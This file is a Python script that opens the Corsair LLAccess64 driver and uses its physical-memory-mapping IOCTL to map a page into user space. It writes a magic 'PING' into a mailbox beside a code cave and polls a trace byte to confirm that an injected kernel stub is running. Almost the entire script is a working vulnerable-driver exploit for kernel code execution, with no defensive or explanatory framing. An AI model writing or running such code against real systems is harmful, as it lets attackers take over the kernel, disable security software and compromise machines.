import ctypes
import struct
import time

# Data from PHYSICAL HOST debug session
CAVE_PA = 0x1007111E0
MAILBOX_PA = (CAVE_PA & ~0xFFF) + 0xF00
NANDO_MAGIC = 0x4E414E444F

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    print(f"[*] Mapping Mailbox Physical Address 0x{MAILBOX_PA:X}...")
    mapped_va = map_page(h, MAILBOX_PA)
    if not mapped_va:
        print("[-] Failed to map mailbox")
        return
    
    mailbox_va = mapped_va + (MAILBOX_PA & 0xFFF)
    print(f"[+] Mailbox mapped at User VA: 0x{mailbox_va:X}")

    # 1. PING
    print("[*] Sending PING...")
    # Clear trace byte first (offset 0x30)
    struct.pack_into("<B", (ctypes.c_ubyte * 64).from_address(mailbox_va), 0x30, 0)
    struct.pack_into("<QII", (ctypes.c_ubyte * 64).from_address(mailbox_va), 0, NANDO_MAGIC, 3, 0)
    
    # Wait for heartbeat to process
    start = time.time()
    while time.time() - start < 3:
        magic = struct.unpack_from("<Q", bytes((ctypes.c_ubyte * 8).from_address(mailbox_va)), 0)[0]
        trace = struct.unpack_from("<B", bytes((ctypes.c_ubyte * 64).from_address(mailbox_va)), 0x30)[0]
        
        if trace == 0x77:
            print("[+] TRACE BYTE DETECTED! Stub is executing.")
            if magic == 0:
                status = struct.unpack_from("<I", bytes((ctypes.c_ubyte * 64).from_address(mailbox_va)), 24)[0]
                print(f"[+] Heartbeat responded! Status: {status}")
                return
            else:
                # Still busy
                pass
        
        time.sleep(0.01)

    print("[-] Heartbeat timed out.")
    trace = struct.unpack_from("<B", bytes((ctypes.c_ubyte * 64).from_address(mailbox_va)), 0x30)[0]
    print(f"[*] Final Trace Byte: 0x{trace:02X}")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
